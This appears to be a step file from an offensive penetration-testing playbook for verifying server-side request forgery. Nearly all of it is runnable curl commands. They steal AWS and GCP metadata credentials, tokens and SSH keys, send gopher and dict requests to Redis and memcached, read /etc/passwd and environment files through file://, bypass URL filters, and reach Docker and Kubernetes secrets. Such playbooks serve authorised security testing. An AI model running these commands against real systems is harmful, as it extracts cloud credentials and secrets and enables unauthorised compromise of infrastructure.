# SSRF — Verify

## Purpose
Confirm exploitable SSRF by accessing internal services, reading cloud metadata credentials, testing protocol smuggling (gopher/dict/file), and bypassing URL filters. Demonstrate full internal network reach.

## Required Variables
- `$TARGET_URL` — vulnerable endpoint
- `$VULN_PARAM` — confirmed SSRF parameter
- `$OUTDIR` — output root

## Commands

### V1 — Internal Service Fingerprinting

```bash
export PATH="/opt/homebrew/bin:$HOME/go/bin:$HOME/Library/Python/3.14/bin:$PATH"

# Banner-grab internal services
curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1:9200/" > "$OUTDIR/ssrf/elas_verify.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1:6379/" > "$OUTDIR/ssrf/redis_verify.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1:11211/" > "$OUTDIR/ssrf/memcached_verify.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1:3000/" > "$OUTDIR/ssrf/port3000_verify.txt"

# Service-specific response signatures
grep -q 'cluster_name\|elasticsearch' "$OUTDIR/ssrf/elas_verify.txt" && echo "[VERIFIED] ElasticSearch at 127.0.0.1:9200"
grep -q 'redis\|ERR' "$OUTDIR/ssrf/redis_verify.txt" && echo "[VERIFIED] Redis at 127.0.0.1:6379"
```

### V2 — AWS Metadata Full Extraction

```bash
# Get the IAM role name
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/" > "$OUTDIR/ssrf/aws_role_name.txt"

IAM_ROLE=$(cat "$OUTDIR/ssrf/aws_role_name.txt" | tr -d '\n' | tr -d ' ')

# Fetch full IAM credentials (AccessKeyId + SecretAccessKey + Token)
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_ROLE}" > "$OUTDIR/ssrf/aws_full_creds.json"

grep -q 'AccessKeyId' "$OUTDIR/ssrf/aws_full_creds.json" && echo "[VERIFIED] AWS IAM credentials extracted" || echo "[-] Could not extract credentials"

# Instance identity document
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/dynamic/instance-identity/document" > "$OUTDIR/ssrf/aws_instance_identity.json"

# User data (may contain secrets)
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/user-data/" > "$OUTDIR/ssrf/aws_userdata.txt"
```

### V3 — GCP Metadata Full Extraction

```bash
# Service account access token
curl -s "$TARGET_URL?${VULN_PARAM}=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" > "$OUTDIR/ssrf/gcp_token.json"

grep -q 'access_token' "$OUTDIR/ssrf/gcp_token.json" && echo "[VERIFIED] GCP access token extracted"

# SSH keys
curl -s "$TARGET_URL?${VULN_PARAM}=http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys" > "$OUTDIR/ssrf/gcp_ssh_keys.txt"

# Startup script
curl -s "$TARGET_URL?${VULN_PARAM}=http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" > "$OUTDIR/ssrf/gcp_startup_script.txt"

# Kube-env (GKE secrets)
curl -s "$TARGET_URL?${VULN_PARAM}=http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env" > "$OUTDIR/ssrf/gcp_kube_env.txt"
```

### V4 — Protocol Smuggling (gopher/dict/file)

```bash
# Redis via gopher
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A" > "$OUTDIR/ssrf/gopher_redis_info.txt"

# Redis CONFIG read
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_CONFIG%20GET%20dir%0D%0AQUIT%0D%0A" > "$OUTDIR/ssrf/gopher_redis_config.txt"

# file:// protocol
curl -s "$TARGET_URL?${VULN_PARAM}=file:///etc/passwd" > "$OUTDIR/ssrf/file_etc_passwd.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=file:///proc/self/environ" > "$OUTDIR/ssrf/file_proc_environ.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=file:///app/.env" > "$OUTDIR/ssrf/file_app_env.txt"

grep -c 'root:x:' "$OUTDIR/ssrf/file_etc_passwd.txt" >/dev/null && echo "[VERIFIED] file:// protocol working — /etc/passwd read"

# dict:// protocol
curl -s "$TARGET_URL?${VULN_PARAM}=dict://127.0.0.1:6379/info" > "$OUTDIR/ssrf/dict_redis_info.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=dict://127.0.0.1:11211/stats" > "$OUTDIR/ssrf/dict_memcached.txt"
```

### V5 — URL Parser Bypass Verification

```bash
# IP representation bypasses
curl -s "$TARGET_URL?${VULN_PARAM}=http://2130706433/" > "$OUTDIR/ssrf/bypass_decimal.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=http://0x7f000001/" > "$OUTDIR/ssrf/bypass_hex.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=http://0177.0.0.1/" > "$OUTDIR/ssrf/bypass_octal.txt"

# Wildcard DNS bypass (nip.io / xip.io)
curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1.nip.io/" > "$OUTDIR/ssrf/bypass_nipio.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254.xip.io/latest/meta-data/" > "$OUTDIR/ssrf/bypass_xipio_aws.txt"

# Credential part bypass
curl -s "$TARGET_URL?${VULN_PARAM}=http://allowed.com@127.0.0.1/" > "$OUTDIR/ssrf/bypass_userinfo.txt"

# URL encoding bypass
curl -s "$TARGET_URL?${VULN_PARAM}=http:%2f%2f127.0.0.1%2f" > "$OUTDIR/ssrf/bypass_encoding.txt"

# IPv6 bypass
curl -s "$TARGET_URL?${VULN_PARAM}=http://[::ffff:127.0.0.1]:80/" > "$OUTDIR/ssrf/bypass_ipv6.txt"
```

### V6 — Docker / Kubernetes Socket Access

```bash
curl -s "$TARGET_URL?${VULN_PARAM}=http://unix:/var/run/docker.sock:/containers/json" > "$OUTDIR/ssrf/docker_containers.txt"
grep -q 'Id.*Image' "$OUTDIR/ssrf/docker_containers.txt" && echo "[VERIFIED] Docker socket accessible"

curl -s "$TARGET_URL?${VULN_PARAM}=https://kubernetes.default.svc/api/v1/secrets" > "$OUTDIR/ssrf/k8s_secrets.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=file:///var/run/secrets/kubernetes.io/serviceaccount/token" > "$OUTDIR/ssrf/k8s_sa_token.txt"
```

## Detection Signals
- AWS `AccessKeyId` in response → IAM credentials extracted
- GCP `access_token` in response → GCP service account token
- `/etc/passwd` content in response → file:// protocol successful
- Redis `$` or `ERR` in response → Redis via gopher confirmed
- Docker JSON with `Id` field → Docker socket accessible
- Kubernetes secret data → cluster compromise

## False Positives
- file:// returns error about unknown scheme — the library may support only http/https
- AWS metadata returns empty — role name extraction may have picked up whitespace; trim and retry
- gopher:// returns error — URL parser may reject unknown schemes; try CRLF injection alternative
- nip.io resolves but target blocks by IP after DNS resolution — test with IP representation bypass instead

## Next
├── If cloud credentials extracted → escalate immediately to `04-impact-escalation.md`
├── If internal service verified → go to `04-impact-escalation.md` for service-specific attacks
├── If protocol smuggling works → go to `04-impact-escalation.md` for Redis/memcached/DB attacks
├── If bypass techniques work → document bypass method and re-test all internal probes
└── Always → save all verification output as evidence